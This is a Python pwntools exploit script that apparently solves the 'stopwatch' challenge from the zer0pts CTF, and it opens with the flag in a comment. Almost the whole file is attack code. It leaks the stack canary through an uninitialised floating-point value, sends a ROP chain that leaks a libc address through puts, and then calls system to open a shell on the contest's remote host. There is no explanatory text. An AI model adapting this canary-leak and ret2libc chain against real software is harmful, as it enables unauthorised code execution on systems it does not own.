#flag = zer0pts{l34k_fr0m_pr3c1s3ly-al1gn3d_un1n1t14l1z3d_buff3r}
from pwn import *

ld = ELF("./ld-2.27.so")
elf = ELF("./stopwatch")
libc = ELF("./libc.so.6")
target = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
target = remote('pwn.ctf.zer0pts.com', 9002)

def sla(s, d):
    target.sendlineafter(s, d)

def double_to_hex(val):
    return struct.pack("<d", val)

name = "whoamiT"
sla("name?\n> ", name)

n = 16
sla("try?\n> ", str(n))

#gdb.attach(target, 'b *0x0000000000400e93\nc\n')

sla("[sec]: ", '+\n\n')

target.recvuntil("close to ")
canary = u64(double_to_hex(float(target.recvuntil(" seconds", drop=True))))
log.info(hex(canary))

pop_rdi = p64(0x0000000000400e93)
ret = p64(0x0000000000400e94)

rop = pop_rdi + p64(0x601ff0) + p64(elf.plt['puts']) + p64(elf.sym['ask_again'])
payload = b"A"*0x18 + p64(canary) + p64(0x4141414141414141) + rop
sla("(Y/n) ", payload)

target.recvuntil('\x10')
libc_base = u64(b"\x10" + target.recv(5) + b"\x00"*2) - (0x00007fe8d9087b10 - 0x00007fe8d9066000)
log.success("LIBC Base: " + hex(libc_base))

rop = ret + pop_rdi + p64(libc_base + 0x7f3162d4ae1a - 0x7f3162b97000) + p64(libc_base + libc.sym['system']) + p64(0x400b07)
payload = b"A"*0x18 + p64(canary) + p64(0x4141414141414141) + rop
sla("(Y/n) ", payload)

target.interactive()